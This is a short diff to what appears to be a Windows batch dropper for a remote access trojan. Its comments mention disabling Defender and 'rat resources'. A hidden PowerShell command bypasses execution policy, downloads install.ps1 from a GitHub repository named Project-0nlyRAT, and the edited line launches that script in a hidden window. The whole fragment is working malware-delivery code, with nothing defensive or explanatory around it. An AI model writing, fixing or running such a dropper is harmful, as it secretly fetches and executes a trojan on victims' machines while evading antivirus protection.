@@ -36,4 +36,4 @@ REM disable defender
 
 REM rat resources
 powershell powershell.exe -noP -W hidden -ep bypass -c "iwr -uri 'https://raw.githubusercontent.com/Soumyo001/Project-0nlyRAT/refs/heads/main/files/install.ps1' -outfile '.\install.ps1'"
-powershell -ep bypass -noP start-process -windowstyle hidden ".\install.ps1"
+powershell -ep bypass -noP start-process powershell.exe -windowstyle hidden ".\install.ps1"
